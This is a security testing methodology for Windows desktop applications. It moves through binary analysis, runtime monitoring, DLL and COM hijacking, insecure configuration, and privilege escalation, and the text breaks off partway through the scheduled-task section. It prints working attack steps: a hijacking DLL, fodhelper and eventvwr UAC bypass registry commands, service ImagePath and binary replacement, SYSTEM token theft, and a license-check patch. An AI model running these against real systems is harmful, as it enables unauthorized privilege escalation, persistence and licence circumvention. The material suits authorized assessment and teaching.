# Windows Thick Client Application Security Testing Methodology

**Version:** 1.0
**Date:** 2026-01-28
**Classification:** Security Testing Methodology
**Platform:** Windows Desktop Applications

---

## Overview

This methodology provides a comprehensive framework for security testing of Windows thick client applications, including native executables (PE format), .NET applications, and hybrid architectures. Testing covers both 32-bit (IA-32) and 64-bit (x86-64) Windows platforms.

**Scope:** Desktop applications installed on Windows systems (Windows 10, 11, Server 2019, Server 2022, Server 2025)

**Authoritative Sources:**
- [PTES (Penetration Testing Execution Standard)](https://www.pentest-standard.org/)
- [NIST SP 800-115: Technical Guide to Information Security Testing and Assessment](https://csrc.nist.gov/pubs/sp/800/115/final)
- [OSSTMM (Open Source Security Testing Methodology Manual)](https://www.isecom.org/OSSTMM.3.pdf)
- [MITRE ATT&CK for Enterprise (Windows)](https://attack.mitre.org/)
- [CIS Microsoft Windows Benchmarks](https://www.cisecurity.org/cis-benchmarks) (2024 Updates)
- [Microsoft Security Baselines](https://learn.microsoft.com/en-us/windows/security/operating-system-security/device-management/windows-security-configuration-framework/windows-security-baselines)
- [SEI CERT C++ Coding Standard](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88046682)
- [OWASP Application Security Verification Standard (ASVS)](https://owasp.org/www-project-application-security-verification-standard/)

---

## Methodology Structure

This methodology follows an 8-phase approach aligned with PTES and NIST SP 800-115:

1. **Application Fingerprinting** - Identify binary type, frameworks, dependencies
2. **PE Binary Analysis** - Analyze Portable Executable structure and security features
3. **Runtime Analysis** - Monitor behavior during execution
4. **DLL Hijacking & Code Injection** - Test for dynamic library vulnerabilities
5. **Configuration Security** - Analyze registry, config files, and permissions
6. **Privilege Escalation** - Test UAC bypass and token manipulation
7. **Memory Corruption** - Test for buffer overflows and heap vulnerabilities
8. **Network Security** - Analyze client-side network communications

---

## Phase 1: Application Fingerprinting

**Objective:** Identify application architecture, development frameworks, and dependencies.

### 1.1 PE Header Analysis

**Tools:** [Detect-It-Easy (DIE)](https://github.com/horsicq/Detect-It-Easy), [PE-bear](https://github.com/hasherezade/pe-bear-releases), [CFF Explorer](https://ntcore.com/?page_id=388)

**Technique:**
```powershell
# Basic file information
Get-Item .\application.exe | Format-List *

# PE header inspection with PowerShell
$bytes = [System.IO.File]::ReadAllBytes(".\application.exe")
[System.Text.Encoding]::ASCII.GetString($bytes[0..1])  # Check for "MZ" header

# Using Detect-It-Easy
diec.exe application.exe
```

**Look for:**
- PE type: PE32 (32-bit) or PE32+ (64-bit)
- Compiler signature: MSVC, GCC, MinGW, Delphi, .NET
- Subsystem: GUI, Console, Native
- Section names (.text, .data, .rdata, .rsrc)
- Import Address Table (IAT) for API dependencies

**MITRE ATT&CK:** [T1083 - File and Directory Discovery](https://attack.mitre.org/techniques/T1083/)

### 1.2 Framework Detection

**Identify development framework:**

**Native C/C++:**
```powershell
# Check for MSVC runtime dependencies
dumpbin /dependents application.exe | Select-String "msvcr|vcruntime"
```

**.NET Framework/Core:**
```powershell
# Check for .NET assembly
$assembly = [System.Reflection.Assembly]::LoadFile("C:\path\to\application.exe")
$assembly.ImageRuntimeVersion
```

**Electron/Chromium:**
```powershell
# Check for Electron framework files
Get-ChildItem -Path "C:\Program Files\AppName" -Recurse | Where-Object {$_.Name -match "electron|chrome|node"}
```

**Qt Framework:**
```powershell
# Look for Qt DLLs
Get-ChildItem -Path "C:\Program Files\AppName" -Filter "Qt*.dll"
```

**Reference:** [CIS Microsoft Windows Benchmarks](https://www.cisecurity.org/benchmark/microsoft_windows_desktop) (Section 18: Application Security)

### 1.3 Dependency Mapping

**Tools:** [Dependencies](https://github.com/lucasg/Dependencies), [dumpbin](https://learn.microsoft.com/en-us/cpp/build/reference/dumpbin-reference)

**Map DLL dependencies:**
```powershell
# Using dumpbin (Visual Studio tool)
dumpbin /imports application.exe

# Using Dependencies GUI
Dependencies.exe -modules application.exe

# Check for delay-loaded DLLs
dumpbin /delayload application.exe
```

**Analyze imports for security-relevant APIs:**
- **Crypto:** `CryptEncrypt`, `BCryptEncrypt`, `CryptProtectData`
- **Network:** `WSAStartup`, `connect`, `HttpSendRequest`, `WinHttpOpen`
- **Process:** `CreateProcess`, `ShellExecute`, `WinExec`
- **Registry:** `RegOpenKeyEx`, `RegSetValueEx`, `RegQueryValueEx`
- **File I/O:** `CreateFile`, `ReadFile`, `WriteFile`, `DeleteFile`

**Security Baseline:** [Microsoft Security Baselines - Windows 11 24H2](https://techcommunity.microsoft.com/blog/microsoft-security-baselines/windows-11-version-24h2-security-baseline/4252801)

### 1.4 Cryptographic Library Identification

**Identify crypto implementations:**

```powershell
# Search for crypto library strings
strings application.exe | Select-String -Pattern "openssl|crypto|aes|rsa|sha"

# Check for CryptoAPI usage
dumpbin /imports application.exe | Select-String "Crypt|Bcrypt"

# Look for third-party crypto libraries
Get-ChildItem "C:\Program Files\AppName" -Filter "*crypto*.dll"
```

**Common libraries:**
- Windows CryptoAPI / CNG (Cryptography API: Next Generation)
- OpenSSL
- Libsodium
- Crypto++
- BouncyCastle (.NET)

**Reference:** [SEI CERT C++ Coding Standard - MSC](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88046682) (Miscellaneous rules including crypto)

---

## Phase 2: PE Binary Analysis

**Objective:** Analyze PE binary structure, security mitigations, and identify hardcoded secrets.

### 2.1 Security Mitigation Analysis

**Tools:** [PESecurity](https://github.com/NetSPI/PESecurity), [checksec.py](https://github.com/Wenzel/checksec.py)

**Check security features:**
```powershell
# Using PESecurity PowerShell module
Import-Module .\Get-PESecurity.psm1
Get-PESecurity -file application.exe

# Manual check with dumpbin
dumpbin /headers application.exe | Select-String "DLL characteristics"
```

**Security features to verify:**

| Feature | Flag | Description | CWE |
|---------|------|-------------|-----|
| DEP/NX | `IMAGE_DLLCHARACTERISTICS_NX_COMPAT` | Data Execution Prevention | CWE-119 |
| ASLR | `IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE` | Address Space Layout Randomization | CWE-120 |
| SEH | `IMAGE_DLLCHARACTERISTICS_NO_SEH` | Structured Exception Handling protection | CWE-242 |
| CFG | `IMAGE_DLLCHARACTERISTICS_GUARD_CF` | Control Flow Guard | CWE-691 |
| SafeSEH | `/SAFESEH` | Safe SEH handler validation | CWE-242 |
| High Entropy ASLR | `IMAGE_DLLCHARACTERISTICS_HIGH_ENTROPY_VA` | 64-bit ASLR entropy | CWE-120 |

**Vulnerability:** Missing security mitigations indicate vulnerable compilation, potentially exploitable via memory corruption attacks.

**Reference:** [CIS Windows Benchmarks - Security Options](https://www.cisecurity.org/cis-benchmarks)

### 2.2 Static Reverse Engineering

**Tools:** [Ghidra](https://ghidra-sre.org/), [IDA Pro](https://hex-rays.com/ida-pro/), [Binary Ninja](https://binary.ninja/), [Radare2](https://rada.re/)

**Ghidra analysis workflow:**
```bash
# Import binary into Ghidra
# 1. Create new project
# 2. Import file → application.exe
# 3. Analyze → Use default analyzers
# 4. Review Symbol Tree for imported functions
# 5. Search for strings (Window → Defined Strings)
```

**Look for:**
- **Hardcoded credentials:** Search for patterns like `password`, `apikey`, `token`, `secret`
- **Crypto keys:** AES keys, RSA private keys, encryption salts
- **API endpoints:** URLs, IP addresses, domain names
- **SQL queries:** Potential SQL injection if user input concatenated
- **Dangerous functions:** `strcpy`, `sprintf`, `gets` (buffer overflow risk)
- **Command execution:** `system()`, `ShellExecute()`, `CreateProcess()` with user input

**MITRE ATT&CK:** [T1552.001 - Credentials in Files](https://attack.mitre.org/techniques/T1552/001/)

**Example: Finding hardcoded credentials in Ghidra:**
```c
// Decompiled function showing hardcoded API key
void authenticateUser(void) {
    char *apiKey = "sk_live_51HqT2KLmN8pQ9rS";  // ⚠️ HARDCODED SECRET
    char *endpoint = "https://api.payment.com/v1/auth";

    sendRequest(endpoint, apiKey);
}
```

**Reference:** [OWASP ASVS V2: Authentication](https://owasp.org/www-project-application-security-verification-standard/)

### 2.3 .NET Decompilation

**Tools:** [dnSpy](https://github.com/dnSpy/dnSpy), [ILSpy](https://github.com/icsharpcode/ILSpy), [dotPeek](https://www.jetbrains.com/decompiler/)

**.NET assemblies are easily decompiled to source code:**

```powershell
# Check if application is .NET
$assembly = [System.Reflection.Assembly]::LoadFile("C:\path\to\application.exe")
$assembly.GetName()

# Launch dnSpy
dnSpy.exe application.exe
```

**dnSpy analysis steps:**
1. Load executable → Automatically decompiles to C#
2. **Search for credentials:** Edit → Search Assemblies → "password"
3. **Analyze authentication logic:** Check for client-side validation bypass
4. **Inspect API calls:** Review HTTP requests for tampering opportunities
5. **Check obfuscation:** Tools like ConfuserEx, .NET Reactor (may hinder analysis)

**Common .NET vulnerabilities:**
- **Insecure deserialization:** `BinaryFormatter.Deserialize()` with untrusted data (CWE-502)
- **SQL injection:** String concatenation in SQL queries (CWE-89)
- **XML injection:** `XmlDocument.Load()` with external entities enabled (CWE-611)
- **Client-side validation only:** Business logic enforced client-side (CWE-602)

**Reference:** [.NET Decompilers Showdown 2024](https://dotnetexpert.net/blogs/dotnet-decompiler-showdown)

**Example: dnSpy revealing insecure deserialization:**
```csharp
// Decompiled C# code
public void LoadSettings(string data) {
    BinaryFormatter formatter = new BinaryFormatter();
    MemoryStream stream = new MemoryStream(Convert.FromBase64String(data));
    Settings settings = (Settings)formatter.Deserialize(stream);  // ⚠️ INSECURE
}
```

**MITRE ATT&CK:** [T1027 - Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/)

### 2.4 Resource Analysis

**Extract embedded resources:**

```powershell
# Using Resource Hacker
ResourceHacker.exe -open application.exe -save resources.txt -action extract

# Check for embedded files
strings application.exe | Select-String -Pattern "http|ftp|\\\\|config|key"

# Extract icons, images, dialogs
# Resources may contain: config files, embedded DLLs, certificates, keys
```

**Look for:**
- Embedded configuration files (XML, JSON, INI)
- Certificates and private keys
- Secondary executables or DLLs
- License keys or activation codes

**Reference:** [NIST SP 800-115 Section 5.3 - Application Testing](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-115.pdf)

---

## Phase 3: Runtime Analysis

**Objective:** Monitor application behavior during execution to identify runtime vulnerabilities.

### 3.1 Process Monitoring

**Tools:** [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon), [Process Explorer](https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer)

**Procmon analysis:**
```powershell
# Launch Procmon with filter for target application
Procmon.exe /BackingFile C:\logs\app_trace.pml /Minimized

# Filters:
# - Process Name is application.exe
# - Operation is CreateFile, WriteFile, RegSetValue
# - Result is SUCCESS or ACCESS DENIED
```

**Monitor for:**
1. **File system access:**
   - Config files in insecure locations (e.g., `C:\Temp\`)
   - Plaintext credential storage (e.g., `%APPDATA%\credentials.txt`)
   - Executable files written to temp directories (potential DLL hijacking)

2. **Registry operations:**
   - Credentials stored in registry (e.g., `HKCU\Software\AppName\Password`)
   - Weak registry ACLs (writable by low-privilege users)
   - Auto-start registry keys (persistence mechanism)

3. **Network activity:**
   - Unencrypted HTTP traffic (credentials in transit)
   - Certificate validation failures
   - DNS requests (for C2 behavior analysis)

**Example finding:**
```
Application writes plaintext API key to:
C:\Users\Public\AppName\config.ini

[Security]
APIKey=sk_live_51HqT2KLmN8pQ9rS
```

**MITRE ATT&CK:** [T1083 - File and Directory Discovery](https://attack.mitre.org/techniques/T1083/), [T1012 - Query Registry](https://attack.mitre.org/techniques/T1012/)

**Reference:** [OSSTMM Section 4.6 - Process Monitoring](https://www.isecom.org/OSSTMM.3.pdf)

### 3.2 API Call Tracing

**Tools:** [API Monitor](http://www.rohitab.com/apimonitor), [Frida](https://frida.re/)

**API Monitor setup:**
```powershell
# 1. Launch API Monitor
# 2. Select API filters: Crypt*, Reg*, File*, Network*, Process*
# 3. Monitor process: application.exe
# 4. Capture API calls during sensitive operations (login, payment)
```

**Key APIs to monitor:**

**Cryptography:**
- `CryptEncrypt` / `CryptDecrypt` - Check for weak algorithms (DES, RC4)
- `CryptCreateHash` - Verify strong hashing (SHA-256+, not MD5/SHA-1)
- `BCryptGenRandom` - Ensure secure random number generation

**Network:**
- `InternetConnect` - Check for hardcoded servers
- `HttpSendRequest` - Inspect headers and body for secrets
- `WSASend` / `WSARecv` - Analyze raw socket data

**Process Creation:**
- `CreateProcess` - Check for command injection if user input included
- `ShellExecute` - Verify no arbitrary command execution

**Reference:** [SEI CERT C++ Coding Standard - FIO](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88046682) (File I/O rules)

### 3.3 Dynamic Debugging

**Tools:** [x64dbg](https://x64dbg.com/), [WinDbg](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/)

**x64dbg debugging workflow:**
```
1. Load executable: File → Open → application.exe
2. Set breakpoint on interesting function (e.g., authentication)
   - bp CreateProcessW
   - bp InternetConnectW
   - bp CryptEncrypt
3. Run application: Debug → Run (F9)
4. Inspect registers and stack when breakpoint hit
5. Step through instructions: Step Into (F7) or Step Over (F8)
```

**Common breakpoints for security testing:**
- **Authentication:** `strcmp`, `wcscmp`, `memcmp` (check password comparison)
- **Crypto:** `CryptEncrypt`, `BCryptEncrypt` (inspect plaintext and keys)
- **Network:** `send`, `WSASend`, `HttpSendRequest` (inspect traffic before encryption)
- **File I/O:** `CreateFile`, `WriteFile` (check what's written where)

**Example: Bypassing license check:**
```asm
; Before patch:
004015A0: test eax, eax        ; Check if license valid
004015A2: je   invalid_license ; Jump if invalid
004015A4: ; Continue execution

; After patch (force valid license):
004015A0: xor eax, eax         ; Always set to 0
004015A2: jmp  valid_license   ; Always jump to valid path
```

**MITRE ATT&CK:** [T1622 - Debugger Evasion](https://attack.mitre.org/techniques/T1622/)

**Reference:** [Malware Analysis with x64dbg and Ghidra](https://github.com/x64dbg/x64dbg)

### 3.4 Memory Inspection

**Tools:** [Process Hacker](https://processhacker.sourceforge.io/), [Volatility](https://www.volatilityfoundation.org/)

**Dump process memory:**
```powershell
# Using Process Hacker
# 1. Find target process
# 2. Right-click → Properties → Memory tab
# 3. Select region → Dump → Save to file

# Search dumped memory for secrets
strings memory.dmp | Select-String "password|token|key|secret"

# Look for crypto keys (AES-256 = 32 bytes hex)
strings memory.dmp | Select-String "[0-9A-Fa-f]{64}"
```

**What to look for:**
- Plaintext passwords in memory after "secure" authentication
- Session tokens or API keys
- Decrypted data (encryption key may be in memory)
- Database connection strings

**Reference:** [NIST SP 800-115 Section 7 - Supplemental Testing](https://csrc.nist.gov/pubs/sp/800/115/final)

---

## Phase 4: DLL Hijacking & Code Injection

**Objective:** Test for DLL search order vulnerabilities and code injection vectors.

### 4.1 DLL Search Order Hijacking

**Tools:** [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon), [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

**MITRE ATT&CK Technique:** [T1574.001 - Hijack Execution Flow: DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001/)

**Windows DLL search order (without SafeDllSearchMode):**
1. Directory where application is loaded from
2. Current directory (`GetCurrentDirectory()`)
3. System directory (`C:\Windows\System32`)
4. 16-bit system directory (`C:\Windows\System`)
5. Windows directory (`C:\Windows`)
6. Directories in `%PATH%` environment variable

**Reference:** [Microsoft - Dynamic-Link Library Search Order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)

**Identify vulnerable DLLs:**
```powershell
# Run application with Procmon filtering:
# - Operation: CreateFile
# - Path: ends with .dll
# - Result: NAME NOT FOUND

# Example output:
application.exe    CreateFile    C:\Users\test\vulnerable.dll    NAME NOT FOUND
```

**Create malicious DLL:**
```c
// malicious.dll - Proof of concept
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        MessageBox(NULL, "DLL Hijacked!", "PoC", MB_OK);
        // In real attack: spawn reverse shell, steal data, etc.
    }
    return TRUE;
}
```

**Compile and test:**
```powershell
# Compile malicious DLL
cl.exe /LD malicious.c /Fe:vulnerable.dll

# Place in hijackable location
Copy-Item vulnerable.dll "C:\Users\test\"

# Run application - if DLL loads, vulnerability confirmed
.\application.exe
```

**Exploitation scenarios:**
1. **Application directory writeable:** Place DLL in app folder (highest search order)
2. **Current directory exploitation:** Launch app from attacker-controlled directory
3. **PATH poisoning:** Add malicious directory to PATH before legitimate ones

**Mitigation verification:**
- Application uses absolute paths for `LoadLibrary()`
- Application calls `SetDllDirectory("")` to remove current directory from search
- DLL signature verification implemented

**Reference:** [CIS Windows Benchmark 18.9 - Windows Components](https://www.cisecurity.org/benchmark/microsoft_windows_desktop)

### 4.2 Phantom DLL Hijacking

**Identify phantom DLLs (non-existent dependencies):**

```powershell
# Check for missing DLLs that would be loaded if present
dumpbin /imports application.exe | Select-String "\.dll"

# Cross-reference with actual DLLs in system
$imports = dumpbin /imports application.exe
$systemDLLs = Get-ChildItem "C:\Windows\System32\*.dll"
# Identify DLLs in imports but not in System32
```

**Common phantom DLLs:**
- `version.dll`
- `dwmapi.dll`
- `cryptbase.dll`
- `uxtheme.dll`

**Exploitation:** Drop phantom DLL in application directory → Executed on app launch.

**MITRE ATT&CK:** [T1574.002 - DLL Side-Loading](https://attack.mitre.org/techniques/T1574/002/)

**Reference:** [Detecting DLL Search Order Hijacking - GIAC](https://www.giac.org/paper/gcda/141/detecting-dll-search-order-hijacking-purple-team-approach-create-defensive-techniques-tactical-siem/163896)

### 4.3 COM Hijacking

**MITRE ATT&CK:** [T1546.015 - Event Triggered Execution: Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015/)

**Identify COM objects loaded by application:**
```powershell
# Monitor registry access for CLSID lookups
# Filter: Path contains "CLSID" AND Process Name is application.exe

# Example vulnerable COM object:
# HKCU\Software\Classes\CLSID\{GUID}\InprocServer32
# Points to DLL - if HKCU writable, can be hijacked
```

**Test COM hijacking:**
```powershell
# Find COM object used by application
$regPath = "HKCU:\Software\Classes\CLSID\{00000000-0000-0000-0000-000000000000}\InprocServer32"

# Check if current user can write
Get-Acl $regPath | Format-List

# If writable, modify to point to malicious DLL
Set-ItemProperty -Path $regPath -Name "(Default)" -Value "C:\malicious.dll"
```

**Reference:** [UAC Bypass and COM Interface Abuse](https://www.fortinet.com/blog/threat-research/offense-and-defense-a-tale-of-two-sides-bypass-uac)

### 4.4 AppInit_DLLs Injection

**Check if application vulnerable to global DLL injection:**

```powershell
# Query registry for AppInit_DLLs
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" | Select-Object AppInit_DLLs, LoadAppInit_DLLs

# If LoadAppInit_DLLs = 1, all processes load DLLs listed in AppInit_DLLs
# Requires admin to modify, but check if application relies on this mechanism
```

**Security note:** Microsoft deprecated AppInit_DLLs due to security risks. Modern applications should NOT use this mechanism.

**Reference:** [Microsoft Security Baseline - Disable AppInit_DLLs](https://learn.microsoft.com/en-us/windows/security/operating-system-security/device-management/windows-security-configuration-framework/windows-security-baselines)

---

## Phase 5: Configuration Security

**Objective:** Analyze configuration files, registry keys, and file permissions for security weaknesses.

### 5.1 Configuration File Analysis

**Locate config files:**
```powershell
# Common locations
$configPaths = @(
    "$env:APPDATA\ApplicationName",
    "$env:LOCALAPPDATA\ApplicationName",
    "$env:ProgramData\ApplicationName",
    "C:\ProgramData\ApplicationName",
    "C:\Program Files\ApplicationName"
)

# Search for config files
Get-ChildItem $configPaths -Recurse -Include *.config, *.xml, *.ini, *.json, *.yaml
```

**Analyze for security issues:**
1. **Plaintext credentials:**
```xml
<!-- Vulnerable config file -->
<configuration>
    <connectionStrings>
        <add name="DB" connectionString="Server=db.internal;User=admin;Password=P@ssw0rd123;" />
    </connectionStrings>
</configuration>
```

2. **Insecure file permissions:**
```powershell
# Check if config file is world-writable
Get-Acl "C:\ProgramData\AppName\config.xml" | Format-List

# Vulnerable: Users group has Modify permission
```

3. **Hardcoded API keys:**
```json
{
  "api": {
    "key": "sk_live_51HqT2KLmN8pQ9rS",
    "endpoint": "https://api.example.com"
  }
}
```

**MITRE ATT&CK:** [T1552.001 - Credentials in Files](https://attack.mitre.org/techniques/T1552/001/)

**Reference:** [CIS Windows Benchmark 17 - Advanced Audit Policy Configuration](https://www.cisecurity.org/cis-benchmarks)

### 5.2 Registry Security Testing

**Tools:** [AccessChk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk), [RegShot](https://github.com/Seabreg/Regshot)

**Identify application registry keys:**
```powershell
# Take "before" snapshot
regshot.exe /1 /outdir:C:\logs

# Run application
.\application.exe

# Take "after" snapshot
regshot.exe /2 /compare /outdir:C:\logs

# Review diff for new/modified keys
```

**Check registry permissions:**
```powershell
# Using accesschk
accesschk.exe -kvuqsw "HKCU\Software\ApplicationName"
accesschk.exe -kvuqsw "HKLM\Software\ApplicationName"

# Look for: RW (read-write) for non-admin users
# Vulnerable if low-privilege user can modify service/application keys
```

**Common vulnerable registry locations:**
```powershell
# Auto-start keys (persistence)
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"

# Service ImagePath (if writable, can hijack service)
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\AppService" | Select-Object ImagePath

# Credentials storage (insecure)
Get-ItemProperty "HKCU:\Software\AppName" | Select-Object *password*
```

**Test weak permissions exploitation:**
```powershell
# If Users group has Write access to service registry key:
$servicePath = "HKLM:\SYSTEM\CurrentControlSet\Services\VulnerableService"

# Check current ImagePath
Get-ItemProperty $servicePath -Name ImagePath

# Modify to point to malicious executable
Set-ItemProperty $servicePath -Name ImagePath -Value "C:\malicious.exe"

# Restart service to trigger execution
Restart-Service VulnerableService
```

**MITRE ATT&CK:** [T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys](https://attack.mitre.org/techniques/T1547/001/)

**Reference:** [Windows Privilege Escalation: Weak Registry Permission](https://www.hackingarticles.in/windows-privilege-escalation-weak-registry-permission/)

### 5.3 Temporary File Security

**Monitor temp file creation:**
```powershell
# Procmon filter: Path begins with C:\Users\<user>\AppData\Local\Temp

# Check what application writes to temp
Get-ChildItem "$env:TEMP" -Recurse | Where-Object {$_.LastWriteTime -gt (Get-Date).AddMinutes(-5)}
```

**Vulnerabilities to identify:**
1. **Plaintext data in temp files:**
```powershell
# Application creates temporary decrypted file
C:\Users\user\AppData\Local\Temp\decrypted_data.tmp
# Contains: Credit card numbers, PII, passwords
```

2. **Predictable temp file names:**
```c
// Vulnerable code
char tempFile[MAX_PATH];
sprintf(tempFile, "C:\\Temp\\app_temp.dat");  // ⚠️ PREDICTABLE
```
**Exploitation:** Attacker creates file first (symlink attack, race condition).

3. **Insecure temp file permissions:**
```powershell
# Check ACL
Get-Acl "C:\Temp\app_temp.dat" | Format-List
# If world-readable → information disclosure
```

**Secure alternative:**
```c
// Secure temp file creation
TCHAR tempPath[MAX_PATH];
TCHAR tempFile[MAX_PATH];
GetTempPath(MAX_PATH, tempPath);
GetTempFileName(tempPath, TEXT("APP"), 0, tempFile);  // Creates unique file with restricted ACL
```

**Reference:** [SEI CERT C++ Coding Standard - FIO21-CPP](https://wiki.sei.cmu.edu/confluence/display/cplusplus/FIO21-CPP.+Do+not+create+temporary+files+in+shared+directories)

### 5.4 Log File Security

**Check logging practices:**
```powershell
# Locate log files
Get-ChildItem "C:\ProgramData\AppName" -Filter *.log
Get-ChildItem "$env:APPDATA\AppName" -Filter *.log

# Search for sensitive data in logs
Select-String -Path "C:\ProgramData\AppName\*.log" -Pattern "password|token|ssn|credit"
```

**Common logging vulnerabilities:**
1. **Sensitive data logging:**
```
[2026-01-28 12:34:56] User login: username=admin, password=P@ssw0rd123  ⚠️
[2026-01-28 12:35:10] API request: Authorization: Bearer sk_live_51Hq...  ⚠️
```

2. **World-readable log files:**
```powershell
icacls "C:\ProgramData\AppName\app.log"
# Vulnerable: BUILTIN\Users:(R)  - All users can read
```

3. **Log injection:**
```
User input: admin\r\n[2026-01-28] ADMIN ACTION: Grant privileges
Logged as:
[2026-01-28] User login: admin
[2026-01-28] ADMIN ACTION: Grant privileges  ⚠️ FORGED
```

**Reference:** [OWASP Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)

---

## Phase 6: Privilege Escalation

**Objective:** Test for vulnerabilities allowing unprivileged user to gain elevated privileges.

### 6.1 UAC Bypass Techniques

**MITRE ATT&CK:** [T1548.002 - Abuse Elevation Control Mechanism: Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002/)

**Reference:** [Elastic Security Labs - Windows UAC Bypasses: Techniques and Detection](https://www.elastic.co/security-labs/exploring-windows-uac-bypasses-techniques-and-detection-strategies)

**Common UAC bypass methods:**

**1. fodhelper.exe Registry Hijacking:**
```powershell
# fodhelper is auto-elevated and checks HKCU (user-writable)
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\malicious.exe" -Force

# Trigger
Start-Process "C:\Windows\System32\fodhelper.exe"
# malicious.exe runs with High integrity
```

**2. eventvwr.exe MSC Hijacking:**
```powershell
# eventvwr checks HKCU for .msc file association
New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "C:\malicious.exe" -Force

# Trigger
Start-Process "C:\Windows\System32\eventvwr.exe"
```

**3. COM Elevation Moniker:**
```powershell
# Exploit COM objects with "Elevation:Enabled" registry value
$CLSID = "{GUID-with-elevation}"
$Type = [Type]::GetTypeFromCLSID($CLSID)
$Object = [Activator]::CreateInstance($Type)
# Object created with High integrity
```

**Recent 2024 UAC Bypass (CVE-2024-6769):**
- Exploits token manipulation to escalate from Medium → High → SYSTEM integrity
- Microsoft considers this "expected behavior" (not patched as vulnerability)
- Reference: [Novel Exploit Chain Enables Windows UAC Bypass](https://foresiet.com/blog/novel-exploit-chain-enables-windows-uac-bypass-understanding-cve-2024-6769)

**Testing methodology:**
```powershell
# Check current integrity level
whoami /groups | Select-String "Mandatory Label"

# After UAC bypass, should show:
# Mandatory Label\High Mandatory Level (instead of Medium)
```

### 6.2 Token Manipulation

**MITRE ATT&CK:** [T1134 - Access Token Manipulation](https://attack.mitre.org/techniques/T1134/)

**Tools:** [Tokenvator](https://github.com/0xbadjuju/Tokenvator), [Invoke-TokenManipulation](https://github.com/PowerShellMafia/PowerSploit)

**Token duplication attack:**
```powershell
# PowerSploit module
Import-Module .\Invoke-TokenManipulation.ps1

# List available tokens
Invoke-TokenManipulation -Enumerate

# Steal SYSTEM token from high-privilege process
Invoke-TokenManipulation -CreateProcess "cmd.exe" -ProcessId 1234 -Username "NT AUTHORITY\SYSTEM"
```

**Check if application handles tokens securely:**
```c
// Vulnerable code - doesn't restrict token privileges
HANDLE hToken;
OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
DuplicateToken(hToken, SecurityImpersonation, &hDupToken);  // ⚠️ Duplicates all privileges
```

**Secure token handling:**
```c
// Limit token to minimum required privileges
HANDLE hToken;
OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE, &hToken);
DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityAnonymous, TokenPrimary, &hDupToken);
// Then remove unnecessary privileges
```

**Reference:** [GitHub - TokenPlayer: Manipulating Windows Access Tokens](https://github.com/S1ckB0y1337/TokenPlayer)

### 6.3 Service Exploitation

**Identify vulnerable services:**
```powershell
# List services installed by application
Get-WmiObject Win32_Service | Where-Object {$_.PathName -like "*ApplicationName*"} | Format-List Name, PathName, StartMode, State

# Check service binary permissions
accesschk.exe -wuvc "ServiceName"

# Check service registry permissions
accesschk.exe -kvuqsw "HKLM:\System\CurrentControlSet\Services\ServiceName"
```

**Vulnerability types:**

**1. Unquoted service path:**
```powershell
# Vulnerable service path (no quotes)
C:\Program Files\Application Name\service.exe

# Windows searches in order:
C:\Program.exe                              ⚠️ If attacker can write here
C:\Program Files\Application.exe            ⚠️ Or here
C:\Program Files\Application Name\service.exe

# Exploit: Place malicious Program.exe in C:\
```

**2. Weak service binary permissions:**
```powershell
# Service executable writable by low-privilege user
icacls "C:\Program Files\AppName\service.exe"
# Shows: BUILTIN\Users:(M)  ⚠️ VULNERABLE

# Exploit: Replace service.exe with malicious version
Copy-Item malicious.exe "C:\Program Files\AppName\service.exe"
Restart-Service VulnerableService
# malicious.exe runs as SYSTEM
```

**3. Weak service registry permissions:**
```powershell
# Service registry key writable
accesschk.exe -kvuqsw "HKLM:\System\CurrentControlSet\Services\VulnerableService"
# Shows: RW BUILTIN\Users  ⚠️ VULNERABLE

# Exploit: Modify ImagePath to malicious executable
```

**MITRE ATT&CK:** [T1574.011 - Hijack Execution Flow: Services Registry Permissions Weakness](https://attack.mitre.org/techniques/T1574/011/)

**Reference:** [Windows Services Pentest Tips](https://abdelaziz-elhawary.medium.com/windows-services-pentest-tips-58e5b88b1aca)

### 6.4 Scheduled Task Exploitation

**Enumerate tasks created by application:**
```powershell
# List all scheduled tasks
Get-ScheduledTask | Where-Object {$_.TaskPath -like "*ApplicationName*"} | Format-List *

# Check task binary permissions
$task = Get-ScheduledTask "TaskName"
$taskAction = $task.Actions[0].Execute
icacls $taskAction
```

**Vulnerabilities:**
1. **Task executable writable by non-admin**
2. **Task runs with SYSTEM privileges**
3. **Task XML file has weak permissions** (`C:\Windows\System32\Tasks\`)

**Exploitation:**
```powershell
# If task XML writable
$xmlPath = "C:\Windows\System32\Tasks\ApplicationTask"
